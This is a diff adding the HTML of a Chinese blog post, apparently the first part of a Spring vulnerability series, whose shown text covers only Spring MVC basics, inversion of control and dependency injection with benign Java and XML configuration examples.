@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="SpringMVC基础知识Spring介绍 Spring是一个轻量级的Java Web开发框架，是分层的Java SE&#x2F;EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="SpringMVC基础知识Spring介绍 Spring是一个轻量级的Java Web开发框架，是分层的Java SE&#x2F;EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式">
+<meta property="og:image" content="https://s2.ax1x.com/2020/03/05/37z6bt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/03/05/3HFZz8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2020/03/06/3b5BGt.png">
+<meta property="article:published_time" content="2020-03-06T07:32:31.000Z">
+<meta property="article:modified_time" content="2020-03-06T07:35:08.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2020/03/05/37z6bt.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/06/Spring漏洞分析系列-一-Spring框架基础与Spring反序列化漏洞/"/>
+
+
+
+
+
+  <title>Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/06/Spring%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%B8%80-Spring%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E4%B8%8ESpring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Spring漏洞分析系列(一)--Spring框架基础与Spring反序列化漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-06T15:32:31+08:00">
+                2020-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="SpringMVC基础知识"><a href="#SpringMVC基础知识" class="headerlink" title="SpringMVC基础知识"></a>SpringMVC基础知识</h3><h4 id="Spring介绍"><a href="#Spring介绍" class="headerlink" title="Spring介绍"></a>Spring介绍</h4><blockquote>
+<p>Spring是一个轻量级的Java Web开发框架，是分层的Java SE/EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p>
+</blockquote>
+<h4 id="spring调用的基本流程"><a href="#spring调用的基本流程" class="headerlink" title="spring调用的基本流程"></a>spring调用的基本流程</h4><p>1.发起请求到前端控制器(DispatcherServlet)<br>        2.前端控制器请求处理器映射器(HandlerMapping)查找Handler(可根据xml配置、注解进行查找)<br>        3.处理器映射器(HandlerMapping)向前端控制器返回Handler<br>        4.前端控制器调用处理器适配器(HandlerAdapter)执行Handler<br>        5.Handler执行完，给适配器返回ModelAndView(Springmvc框架的一个底层对象)<br>        6.处理器适配器(HandlerAdapter)向前端控制器返回ModelAndView<br>        7.前端控制器(DispatcherServlet)请求视图解析器(ViewResolver)进行视图解析，根据逻辑视图名解析成真正的视图(jsp)<br>        8.视图解析器(ViewResolver)向前端控制器(DispatcherServlet)返回View<br>        9.前端控制器进行视图渲染，即将模型数据(在ModelAndView对象中)填充到request域<br>        10.前端控制器向用户响应结果</p>
+<h3 id="Spring-IoC思想"><a href="#Spring-IoC思想" class="headerlink" title="Spring IoC思想"></a>Spring IoC思想</h3><p>IoC思想的作用：主要可通过IoC写出松耦合，更优良的程序。</p>
+<p>在之前的编程中，当我们当前的类依赖另一个类的时候，我们会在这个类的内部去主动创建所依赖的类，从而会导致类之间的高耦合。</p>
+<p>而在Spring 框架中：有了IoC容器，容器会自动帮我们去查找以及注入所依赖对象，对象不再是去主动创建所依赖的类，而是被动的接受所依赖的类，并且new实例工作不由程序来做而是交给Spring容器去做，这也就是为什么IoC叫做控制反转的原由。</p>
+<p>Spring提供了两种IoC容器，分别为BeanFactory和ApplicationContext。</p>
+<ul>
+<li>BeanFactory：<br>BeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。</li>
+<li>ApplicationContext：<br>ApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展：<br>1.MessageSource, 提供国际化的消息访问<br>2.资源访问（如URL和文件）<br>3.事件传递<br>4.Bean的自动装配<br>5.各种不同应用层的Context实现</li>
+</ul>
+<p>在现在的开发工作中，都会尽可能的使用ApplicationContext而非BeanFactory</p>
+<h4 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h4><p>BeanFactory的类体系结构</p>
+<p><img src="https://s2.ax1x.com/2020/03/05/37z6bt.png" alt="37z6bt.png"></p>
+<p>而BeanFactory最常用的API为XmlBeanFactory</p>
+<p>Demo略</p>
+<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>ApplicationContext类体系：</p>
+<p><img src="https://s2.ax1x.com/2020/03/05/3HFZz8.png" alt="3HFZz8.png"></p>
+<p>ApplicationContext 最常用接口：</p>
+<ul>
+<li><strong>FileSystemXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。在这里，你需要提供给构造器XML文件的绝对路径；</li>
+<li><strong>ClassPathXmlApplicationContext</strong>：该容器从XML文件中加载已被定义的Bean。无需提供XML文件的完整路径，只需正确配置CLASSPATH环境变量即可，因为容器会从CLASSPATH中搜索Bean配置文件；</li>
+<li><strong>WebXmlApplicationContext</strong>：该容器会在一个Web应用程序的范围内加载在XML文件中已被定义的 bean；</li>
+</ul>
+<p>Demo略</p>
+<h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><p>在获取ApplicationContext实例后，就可以像BeanFactory一样调用getBean(beanName)返回Bean了。ApplicationContext的初始化和BeanFactory有一个重大的区别：BeanFactory在初始化容器时，并未实例化Bean,直到第一次访问某个Bean时才实例化目标Bean；而ApplicationContext则在初始化应用上下文时就实例化所有单实例的Bean。</p>
+<h4 id="依赖注入-DI"><a href="#依赖注入-DI" class="headerlink" title="依赖注入(DI)"></a>依赖注入(DI)</h4><blockquote>
+<p>当某个Java实例需要另一个Java实例时，传统的方法是由调用者创建被调用者的实例（例如，使用new关键字获得被调用者实例），而使用Spring框架后，被调用者的实例不再由调用者创建，而是由Spring容器创建，这称为控制反转。Spring容器在创建被调用者的实例时，会自动将调用者需要的对象实例注入给调用者，这样，调用者通过Spring容器获得被调用者实例，这称为依赖注入。</p>
+</blockquote>
+<p>而Spring 正是通过这种依赖注入来管理Bean对象之间的依赖关系</p>
+<p>依赖注入主要实现的两种方法有setter和构造方法注入：</p>
+<h5 id="setter方法的依赖注入"><a href="#setter方法的依赖注入" class="headerlink" title="setter方法的依赖注入"></a>setter方法的依赖注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> String msg;    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMsg</span><span class="params">()</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMsg</span><span class="params">(String msg)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">"helloBean"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"com.spring.demo.HelloWorld"</span>&gt;    </span><br><span class="line">       &lt;property name=<span class="string">"msg"</span> value=<span class="string">"Hello World!"</span>/&gt;    </span><br><span class="line"> &lt;/bean&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="构造方法注入"><a href="#构造方法注入" class="headerlink" title="构造方法注入"></a>构造方法注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> Message msg;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloWorld</span><span class="params">(Message msg)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.msg = msg;    </span><br><span class="line">    &#125;    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Message <span class="title">getMsg</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">return</span> msg;    </span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloclass"</span> <span class="attr">class</span>=<span class="string">"com.time.Helloworld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"msg"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">class</span>=<span class="string">"com.test.time"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="集合注入"><a href="#集合注入" class="headerlink" title="集合注入"></a>集合注入</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sw.action;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line"><span class="keyword">import</span> java.util.Set;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DI</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Map map;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Set Set;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> List list;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span> Properties pro;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Map <span class="title">getMap</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMap</span><span class="params">(Map map)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.map = map;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Set <span class="title">getSet</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> Set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSet</span><span class="params">(Set set)</span> </span>&#123;  </span><br><span class="line">  Set = set;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> List <span class="title">getList</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setList</span><span class="params">(List list)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.list = list;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> Properties <span class="title">getPro</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> pro;  </span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPro</span><span class="params">(Properties pro)</span> </span>&#123;  </span><br><span class="line">  <span class="keyword">this</span>.pro = pro;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">beans</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//SPRING//DTD BEAN//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://www.springframework.org/dtd/spring-beans.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"di"</span> <span class="attr">class</span>=<span class="string">"com.sw.action.DI"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- List注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>list3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Set注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"set"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>set3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Map注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"map"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>one<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>two<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">value</span>&gt;</span>three<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Properties注入 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"1"</span>&gt;</span>one<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"2"</span>&gt;</span>two<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">"3"</span>&gt;</span>three<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用函数取出内容</p>
